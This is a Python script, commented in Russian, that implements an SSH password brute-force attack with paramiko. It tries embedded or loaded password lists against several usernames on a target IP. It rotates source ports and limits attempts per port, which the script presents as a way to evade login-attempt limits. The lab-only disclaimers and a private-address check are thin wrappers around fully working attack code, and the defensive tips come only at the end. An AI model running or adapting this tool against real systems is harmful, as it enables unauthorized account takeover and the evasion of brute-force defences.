#!/usr/bin/env python3
"""
Умный SSH Brute Force с ротацией портов и пользователей
ВНИМАНИЕ: Только для использования в собственной лабораторной среде!

Автор: Образовательный материал для изучения кибербезопасности
Лицензия: Только для образовательных целей
"""

import paramiko
import sys
import time
import threading
import argparse
import socket
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

class SmartSSHBruteforce:
    """
    Умный SSH Brute Force с ротацией портов и пользователей
    """
    
    def __init__(self, target_ip, target_port=22):
        self.target_ip = target_ip
        self.target_port = target_port
        self.found_credentials = []
        self.attempts = 0
        self.timeout = 10
        self.delay_between_attempts = 0.5
        self.attempts_per_port = 10  # Количество попыток на один порт
        self.port_rotation_delay = 0.5  # Задержка при смене порта
        self.source_ports = []
        self.current_port_index = 0
        
        # Проверка безопасности
        if not self._is_safe_target(target_ip):
            print("❌ ОШИБКА: SSH атаки разрешены только для локальных сетей!")
            sys.exit(1)
    
    def _is_safe_target(self, ip):
        """Проверка безопасности цели"""
        safe_prefixes = ['127.', '192.168.', '10.']
        
        if ip.startswith('172.'):
            try:
                second_octet = int(ip.split('.')[1])
                return 16 <= second_octet <= 31
            except:
                return False
        
        return any(ip.startswith(prefix) for prefix in safe_prefixes)
    
    def generate_source_ports(self, count=100):
        """
        Генерация случайных портов для подключения
        """
        min_port = 1024
        max_port = 65535
        
        ports = []
        for _ in range(count):
            port = random.randint(min_port, max_port)
            if port not in ports:
                ports.append(port)
        
        self.source_ports = ports
        print(f"✅ Сгенерировано {len(ports)} портов для подключения")
        return ports
    
    def get_next_source_port(self):
        """
        Получение следующего порта для подключения
        """
        if not self.source_ports:
            self.generate_source_ports()
        
        port = self.source_ports[self.current_port_index % len(self.source_ports)]
        self.current_port_index += 1
        
        # Если исчерпали все порты, генерируем новые
        if self.current_port_index >= len(self.source_ports):
            print("🔄 Генерируем новые порты...")
            self.generate_source_ports()
            self.current_port_index = 0
        
        return port
    
    def test_ssh_connection(self, username, password, source_port=None):
        """
        Тестирование SSH соединения с заданными учетными данными
        """
        try:
            # Создаем SSH клиент
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            if source_port:
                # Пытаемся использовать источник порт (может не работать на всех системах)
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.timeout)
                    sock.bind(('', source_port))
                    
                    ssh.connect(
                        self.target_ip,
                        port=self.target_port,
                        username=username,
                        password=password,
                        timeout=self.timeout,
                        allow_agent=False,
                        look_for_keys=False,
                        sock=sock
                    )
                    sock.close()
                except (OSError, socket.error):
                    # Если не удается привязать к порту, используем обычное подключение
                    ssh.connect(
                        self.target_ip,
                        port=self.target_port,
                        username=username,
                        password=password,
                        timeout=self.timeout,
                        allow_agent=False,
                        look_for_keys=False
                    )
            else:
                # Обычное подключение
                ssh.connect(
                    self.target_ip,
                    port=self.target_port,
                    username=username,
                    password=password,
                    timeout=self.timeout,
                    allow_agent=False,
                    look_for_keys=False
                )
            
            # Если дошли сюда, значит подключение успешно
            ssh.close()
            return True
            
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException as e:
            if "Authentication failed" in str(e) or "No existing session" in str(e):
                return False
            else:
                return False
        except Exception as e:
            return False
    
    def brute_force_with_port_rotation(self, usernames, password_list):
        """
        Умная brute force атака с ротацией портов и пользователей
        """
        print(f"🧠 Умная SSH Brute Force атака на {self.target_ip}:{self.target_port}")
        print(f"👥 Пользователи: {', '.join(usernames)}")
        print(f"📁 Словарь паролей: {len(password_list)} паролей")
        print(f"🔄 Попыток на порт: {self.attempts_per_port}")
        print(f"⏳ Задержка при смене порта: {self.port_rotation_delay} сек")
        print(f"⏱️  Timeout: {self.timeout} секунд")
        
        start_time = time.time()
        cycle_count = 0
        
        # Проверяем доступность SSH
        print("\n🔍 Проверяем доступность SSH...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target_ip, self.target_port))
            sock.close()
            
            if result != 0:
                print("❌ SSH недоступен на порту 22")
                return False
            else:
                print("✅ SSH доступен")
        except Exception as e:
            print(f"⚠️  Ошибка проверки SSH: {e}")
        
        print(f"\n🚀 Начинаем умную brute force атаку...")
        print("💡 Нажмите Ctrl+C для остановки")
        
        try:
            while True:
                cycle_count += 1
                print(f"\n🔄 Цикл {cycle_count}: Атакуем {len(usernames)} пользователей...")
                
                # Для каждого пользователя
                for username in usernames:
                    print(f"\n👤 Атакуем пользователя: {username}")
                    
                    # Генерируем новый порт для этого пользователя
                    current_source_port = self.get_next_source_port()
                    print(f"🔀 Используем порт: {current_source_port}")
                    
                    # Перебираем пароли с лимитом попыток на порт
                    attempts_on_current_port = 0
                    
                    for password in password_list:
                        if attempts_on_current_port >= self.attempts_per_port:
                            print(f"⏸️  Достигнут лимит попыток ({self.attempts_per_port}) для порта {current_source_port}")
                            print(f"⏳ Пауза {self.port_rotation_delay} сек перед сменой порта...")
                            time.sleep(self.port_rotation_delay)
                            
                            # Генерируем новый порт
                            current_source_port = self.get_next_source_port()
                            print(f"🔀 Переключаемся на порт: {current_source_port}")
                            attempts_on_current_port = 0
                        
                        self.attempts += 1
                        attempts_on_current_port += 1
                        
                        # Показываем прогресс каждые 5 попыток
                        if self.attempts % 5 == 0:
                            elapsed_time = time.time() - start_time
                            speed = self.attempts / elapsed_time if elapsed_time > 0 else 0
                            print(f"📊 Попытка {self.attempts}: {username}:{password} | Порт: {current_source_port} | Скорость: {speed:.2f} попыток/сек")
                        
                        # Пытаемся подключиться
                        if self.test_ssh_connection(username, password, current_source_port):
                            print(f"🎉 УСПЕХ! Найден пароль: {username}:{password}")
                            self.found_credentials.append((username, password))
                            return True
                        
                        # Задержка между попытками
                        time.sleep(self.delay_between_attempts)
                
                print(f"✅ Завершен цикл {cycle_count} для всех пользователей. Начинаем новый цикл...")
                time.sleep(2)
                
        except KeyboardInterrupt:
            print(f"\n🛑 Атака прервана пользователем")
            return False
        except Exception as e:
            print(f"❌ Ошибка: {e}")
            return False
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\n📊 Результаты brute force:")
        print(f"  • Время выполнения: {duration:.2f} секунд")
        print(f"  • Всего попыток: {self.attempts}")
        print(f"  • Завершено циклов: {cycle_count}")
        print(f"  • Скорость: {self.attempts/duration:.2f} попыток/сек")
        
        if self.found_credentials:
            print(f"  • Найдено учетных записей: {len(self.found_credentials)}")
            for username, password in self.found_credentials:
                print(f"    🎉 {username}:{password}")
            return True
        else:
            print(f"  • Результат: Пароль не найден")
            return False
    
    def load_password_list(self, filename):
        """
        Загрузка списка паролей из файла
        """
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"✅ Загружено {len(passwords)} паролей из {filename}")
            return passwords
        except Exception as e:
            print(f"❌ Ошибка загрузки файла паролей: {e}")
            return []
    
    def load_github_passwords(self):
        """
        Загрузка популярных паролей из GitHub
        """
        passwords = [
            # Kali Linux специфичные пароли
            'kali', 'toor', 'kali123', 'toor123', 'kali2024', 'kali2023',
            'kalilinux', 'kalilinux123', 'kalilinux2024',
            'root', 'root123', 'root2024', 'root2023',
            'admin', 'admin123', 'admin2024', 'admin2023',
            
            # Victor специфичные пароли
            'victor', 'victor123', 'victor2024', 'victor2023',
            'Victor', 'Victor123', 'Victor2024', 'Victor2023',
            'VICTOR', 'VICTOR123', 'VICTOR2024', 'VICTOR2023',
            
            # Популярные пароли
            'password', '123456', 'admin', 'root', 'user', 'test', 'hello',
            'password123', 'admin123', 'root123', 'user123',
            'password1', 'admin1', 'root1', 'user1',
            'password!', 'admin!', 'root!', 'user!',
            'password@', 'admin@', 'root@', 'user@',
            'password#', 'admin#', 'root#', 'user#',
            
            # Простые пароли
            '123', '1234', '12345', '123456', '1234567',
            'pass', 'Pass', 'PASS', 'pass123', 'Pass123', 'PASS123',
            'test', 'Test', 'TEST', 'test123', 'Test123', 'TEST123',
            'user', 'User', 'USER', 'user123', 'User123', 'USER123',
            
            # Пустые и минимальные
            '', '1', '12', '123', '1234', '12345',
            'a', 'aa', 'aaa', 'aaaa', 'aaaaa',
            'q', 'qq', 'qqq', 'qqqq', 'qqqqq',
            'z', 'zz', 'zzz', 'zzzz', 'zzzzz'
        ]
        
        print(f"✅ Загружено {len(passwords)} популярных паролей")
        return passwords

def main():
    """
    Главная функция умного SSH атакующего инструмента
    """
    print("=" * 60)
    print("🧠 УМНЫЙ SSH АТАКУЮЩИЙ ИНСТРУМЕНТ")
    print("=" * 60)
    print("⚠️  ВНИМАНИЕ: Только для использования в собственной лаборатории!")
    print("⚠️  Использование против чужих систем НЕЗАКОННО!")
    print("=" * 60)
    
    parser = argparse.ArgumentParser(description='Умный SSH атакующий инструмент')
    parser.add_argument('target', help='IP адрес цели')
    parser.add_argument('-u', '--usernames', default='root,kali,victor,admin', help='Пользователи для атаки (через запятую)')
    parser.add_argument('-p', '--port', type=int, default=22, help='SSH порт')
    parser.add_argument('-w', '--wordlist', help='Файл со словарем паролей')
    parser.add_argument('--attempts-per-port', type=int, default=10, help='Количество попыток на один порт')
    parser.add_argument('--port-rotation-delay', type=float, default=0.5, help='Задержка при смене порта')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout для SSH соединения')
    parser.add_argument('--delay', type=float, default=0.5, help='Задержка между попытками')
    parser.add_argument('--github-passwords', action='store_true', help='Использовать популярные пароли из GitHub')
    parser.add_argument('--port-count', type=int, default=100, help='Количество портов для генерации')
    
    args = parser.parse_args()
    
    # Создаем экземпляр инструмента
    ssh_attack = SmartSSHBruteforce(args.target, args.port)
    ssh_attack.timeout = args.timeout
    ssh_attack.delay_between_attempts = args.delay
    ssh_attack.attempts_per_port = args.attempts_per_port
    ssh_attack.port_rotation_delay = args.port_rotation_delay
    
    # Генерируем порты
    ssh_attack.generate_source_ports(args.port_count)
    
    # Загружаем пароли
    if args.github_passwords:
        passwords = ssh_attack.load_github_passwords()
    elif args.wordlist:
        passwords = ssh_attack.load_password_list(args.wordlist)
    else:
        # Используем встроенный список
        passwords = [
            'victor', 'Victor', 'VICTOR', 'victor123', 'Victor123', 'VICTOR123',
            'victor1', 'Victor1', 'VICTOR1', 'victor1234', 'Victor1234', 'VICTOR1234',
            'victor!', 'Victor!', 'VICTOR!', 'victor@', 'Victor@', 'VICTOR@',
            'password', '123456', 'admin', 'root', 'kali', 'test', 'hello',
            'password123', 'admin123', 'root123', 'kali123', 'toor', 'toor123'
        ]
    
    if not passwords:
        print("❌ Нет паролей для тестирования")
        return
    
    # Определяем пользователей для атаки
    usernames = [u.strip() for u in args.usernames.split(',')]
    
    try:
        # Запускаем умную brute force атаку
        success = ssh_attack.brute_force_with_port_rotation(usernames, passwords)
        
        if success:
            print("\n🎉 АТАКА УСПЕШНА!")
            print("💡 Рекомендации по защите:")
            print("  • Используйте сильные пароли")
            print("  • Включите двухфакторную аутентификацию")
            print("  • Настройте fail2ban для блокировки IP")
            print("  • Используйте SSH ключи вместо паролей")
            print("  • Ограничьте количество попыток входа")
        else:
            print("\n❌ АТАКА НЕУСПЕШНА")
            print("✅ Система защищена от brute force атак")
            
    except KeyboardInterrupt:
        print("\n🛑 Атака прервана пользователем")
    except Exception as e:
        print(f"❌ Ошибка: {e}")
    
    print("\n📚 Образовательная информация:")
    print("• Умная SSH brute force с ротацией портов")
    print("• Атака нескольких пользователей одновременно")
    print("• Ограничение попыток на порт для обхода лимитов")
    print("• Защита: сильные пароли + fail2ban + 2FA")

if __name__ == "__main__":
    main()
